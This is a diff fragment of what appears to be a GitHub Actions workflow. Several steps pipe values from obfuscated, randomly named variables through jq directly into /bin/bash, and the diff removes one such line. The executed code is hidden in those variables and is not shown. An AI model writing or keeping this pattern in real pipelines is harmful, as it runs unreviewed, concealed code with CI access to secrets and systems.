@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$ujlkd52331" | jq -r .qk0038 | /bin/bash
           printf '%s' "$x86" | jq -r .uenam16767 | /bin/bash
           echo $kppa9 | jq -r .jlblm37 | /bin/bash
-          printf '%s' "$dta5703" | jq -r .remiu54 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
